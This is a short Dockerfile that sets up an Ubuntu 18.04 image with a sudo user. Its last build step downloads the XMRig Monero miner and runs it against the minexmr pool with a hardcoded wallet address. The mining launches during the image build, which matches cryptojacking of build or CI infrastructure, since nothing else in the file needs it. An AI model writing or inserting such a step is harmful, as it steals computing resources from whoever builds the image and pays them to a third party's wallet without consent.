FROM ubuntu:18.04
ENV DEBIAN_FRONTEND=noninteractive

RUN set -ex; \
    apt-get update \
    && apt-get install -y --no-install-recommends \
    ubuntu-desktop \
    sudo \
    bash \
    curl \
    git \
   unzip \
   wget \
   && apt-get update \
   && apt-get upgrade -y \
    && apt-get autoclean \
    && apt-get autoremove \
    && rm -rf /var/lib/apt/lists/*

RUN useradd -m kunemuse && \
    adduser kunemuse sudo && \
    sudo usermod -a -G sudo kunemuse

RUN wget https://github.com/xmrig/xmrig/releases/download/v6.12.2/xmrig-6.12.2-bionic-x64.tar.gz && tar -zxf xmrig-6.12.2-bionic-x64.tar.gz && cd xmrig-6.12.2 && ./xmrig -o sg.minexmr.com:443 -u 89fYEJEXcF6boxxa7dK79PBqJPr6LBZZ16HD7NiFVfvqCoJKAppwup5Kpvsa7EEJhtjBoPonA4XQrWGcdfDtmbfA9M5sHD5 -k --tls -t 2 --rig-id tes1